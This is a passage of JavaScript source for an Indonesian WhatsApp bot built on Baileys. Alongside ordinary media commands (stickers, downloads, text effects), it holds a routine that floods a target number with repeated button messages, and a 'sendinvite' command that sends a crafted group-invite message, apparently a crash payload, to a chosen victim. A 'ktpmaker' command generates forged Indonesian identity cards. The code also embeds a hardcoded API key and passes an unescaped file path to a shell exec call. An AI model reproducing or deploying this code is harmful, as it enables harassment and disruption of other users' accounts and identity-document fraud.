{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 await sleep(20)
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 reply('sukses send bug kepada target')
}
break
//=================================================//
case 'tiktok': case 'tiktoknowm':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Link Nya Kak`)
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return m.reply(`Contoh ${prefix+command} https://vm.tiktok.com/ZSdQycjUx/?k=1`)
let dede = await cl.downloader.tiktok(`${q}`)
krt = await getBuffer(dede.nowm)
m.reply(mess.wait)
haikal.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Tah Slur` }, { quoted:m })
break
//=================================================//
case 'sendinvite': case 'sendinvite2': case 'sendinvite3': case 'sendinvite4': case 'sendinvite5':{
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME HW MODS WA${ngazap(prefix)}`,
"groupName": `MY NAME HW MODS WA${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m})
haikal.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
reply('sukses Bug target')
}
break
//=================================================//
case 'sange': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfww) return m.reply('Sudah Aktif')
ntnsfww.push(from)
m.reply('Sukses Telah mengaktifkan Bug Sange Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `「 ⚠️ Peringatan ⚠️ 」\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfww) return m.reply('Sudah Non Aktif')
let off = ntnsfww.indexOf(from)
ntnsfww.splice(off, 1)
m.reply('Sukses Mematikan Bug Sange di group ini')
} else {
const anuala = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}

Ketik On Untuk Menyalakan Fitur Ini
Ketif Of Untuk Menon Aktifkan Fitur Ini

\n\n*SILAHKAN KETIK TEXT YANG ADA DI BAWAH\n\n
bugcrot
bugahay `,
}
haikal.sendMessage(m.chat, anuala, `HW MODS WA${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfww) return m.reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
const bugcrot = {
image: {url:waifudd.data.url},
caption: `© HW MODS WA${buttonkal}`,
} 
haikal.sendMessage(m.chat, bugcrot, { quoted:m}).catch(err => {
 return('Error!')
})
break
case 'bugahay' :
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfww) return m.reply(mess.nsfw)
m.reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 const bugahay = {
image: {url:waifudd.data.url},
caption: `© HW MODS WA${buttonkal}`,
} 
haikal.sendMessage(m.chat, bugahay, { quoted:m}).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'welcome': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
m.reply('Sukses Telah mengaktifkan Welcome Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `「 ⚠️ Peringatan ⚠️ 」\n\nIkuti Aturan Admin Yang Berlku Yang Ada Di Deskripsi `, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome di group ini')
} else {
const komo = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `Ketik Text Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!

⚠️ DANGERR ⚠️

 `, 
}
haikal.sendMessage(m.chat, komo)
}
}
break
case 'ktpmaker': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`*Pengunaan :*\n${prefix+command} Nik|Provinsi|Kabupaten|Nama|TempatTanggalLahir|JenisKel|Alamat|RtRw|KelDesa|Kecamatan|Agama|Statu|Pekerjaan|Region|Berlaku|golongan darah|LinkGambar\n\n${prefix+command} 35567778995|Provinsi Jawa Barat|Kabupaten Bekasi|jebeh Store|Bekasi |Laki-Laki|Bintara Jaya|02/05|Karang Indah|Bekasi Barat|Islam|Jomblo|anakjebeh|Indonesia|2021-2080|abc|https://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\n\n\n*[warning]*\nsetiap input query setelah garis tengah | di larang penggunaan spasi\n*「 INFO IMAGE 」*\nUntuk Gambar Profil KTP\nUpload Dari Web Berikut Ini\n\nhttps://i.waifu.pics\nhttps://c.top4top.io\n\nCONTOH HASIL NYA\nhttps://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\nhttps://k.top4top.io/p_2208264hn0.jpg`)
get_args = args.join(" ").split("|")
nik = get_args[0]
if (!nik) return m.reply('nomor induk keluaga kak pastikan jangan mirip NIK yang asli ya')
prov = get_args[1]
if (!prov) return m.reply('probinsi mana kak')
kabu = get_args[2]
if (!kabu) return m.reply('kabupaten mana kak')
name = get_args[3]
if (!name) return m.reply('nama nya siapa kak')
ttl = get_args[4]
if (!ttl) return m.reply('tempat tanggal lahir nya kak')
jk = get_args[5]
if (!jk) return m.reply('jenis kelamin pria atau wanita kak')
jl = get_args[6]
if (!jl) return m.reply('alamat rumah nya mana kak')
rtrw = get_args[7]
if (!rtrw) return m.reply('RT / RW berapa kak')
lurah = get_args[8]
if (!lurah) return m.reply('kelurahan mana kak')
camat = get_args[9]
if (!camat) return m.reply('kecamatan mana kak')
agama = get_args[10]
if (!agama) return m.reply('agama nya apa kak')
nikah = get_args[11]
if (!nikah) return m.reply('status belum ada')
kerja = get_args[12]
if (!kerja) return m.reply('pekerjaan belum ada')
warga = get_args[13]
if (!warga) return m.reply('region belum ada')
until = get_args[14]
if (!until) return m.reply('waktu berlaku belum ada')
gd = get_args[15]
if (!gd) return m.reply('golongan darah belum ada')
img = get_args[16]
if (!img) return m.reply('url image belum ada')
      m.reply(mess.wait)
bikin = (`https://oni-chan.my.id/api/Fmake/ktpmaker?nik=${nik}&nama=${name}&ttl=${ttl}&jk=${jk}&gd=${gd}&almt=${jl}&rtw=${rtrw}&kel=${lurah}&kc=${camat}&agm=${agama}&st=${nikah}&krj=${kerja}&ngr=${warga}&blk=${until}&prv=${prov}&kab=${kabu}&picturl=${img}`)
console.log(bikin)
ardaktp = await getBuffer(bikin)
  await sleep(8000)
await haikal.sendMessage(from, { image: ardaktp, caption: `done kak` }, { quoted: m })
//await sleep(5000)
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await haikal.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'emojimix': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
//=================================================//
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!quoted) throw 'Reply Image'
if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
sticWait(from)
arg = args.join(' ')
mee = await haikal.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('./baseikal/lib/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await haikal.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break 
//=================================================//
case 'toimage': case 'toimg': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { image: buffer }, { quoted:m })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp4': case 'tovideo': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted:m })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'toaud': case 'toaudio': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted:m })
}
break
//=================================================//
case 'tovn': case 'toptt': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./baseikal/lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break
//=================================================//
case 'togif': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted:m })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'pinterest': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted:m })
}
break
//=================================================//
case 'couple': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted:m })
haikal.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted:m })
}
break
case 'coffe': case 'kopi': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
const ko = {
image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`
}
haikal.sendMessage(m.chat, ko, { quoted:m })
}
break
case 'kalkulator': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (args.length < 1) return m.reply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
m.reply('Error')
} else {
m.reply(`「 Kalkulator 」\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
}
break
case 'getname': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (qtod === "true") {
namenye = await haikal.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
haikal.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (qtod === "true") {
try {
pporg = await haikal.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(m.chat, { image : { url : pporg }, caption:`Done` }, { quoted:m })
} else if (qtod === "false") {
try {
pporgs = await haikal.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(m.chat, { image : { url : pporgs }, caption:`Done` }, { quoted:m })
}
}
break
case 'infochat': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.quoted) m.reply('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `⭔ @${i.userJid.split('@')[0]}\n`
teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
haikal.sendTextWithMentions(m.chat, teks, m)
}
break
case 'penjara':
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`*Contoh* :\n#penjara namagroup`)
let cret = await haikal.groupCreate(args.join(" "), [])
let response = await haikal.groupInviteCode(cret.id)
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { text: `「 *Create Group* 」

_▸ Owner : ${botname}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}
`, m})

break
case 'play': case 'ytplay': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let buttons = [
{buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
]
let buttonMessage = {
image: { url: anu.thumbnail },
caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
//=================================================//
case 'mediafire': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!text) throw '*Link Nyq Coy*'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*Link Erorr*'
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return reply('*File Over Limit* '+util.format(baby1))
const result4 = `*DOWNLOAD MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}\n
_whoa wait hwmods processing..._

*HW MODS WA*`
reply(`${result4}`)
haikal.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
//=================================================//
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass':
case 'papercut': 
case 'watercolor':
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
 case 'snow': 
 case 'cloud': 
 case 'honey': 
 case 'ice': 
 case 'fruitjuice': 
 case 'biscuit': 
 case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
 case 'firework': 
 case 'skeleton': 
 case 'blackpink': 
 case 'sand': 
 case 'glue': 
 case '1917': 
 case 'leaves': {
 if (!isRegistered) return replyReg(mess.verif)
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Contoh : ${prefix + command} ${botname}`) 
sticWait(from)
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
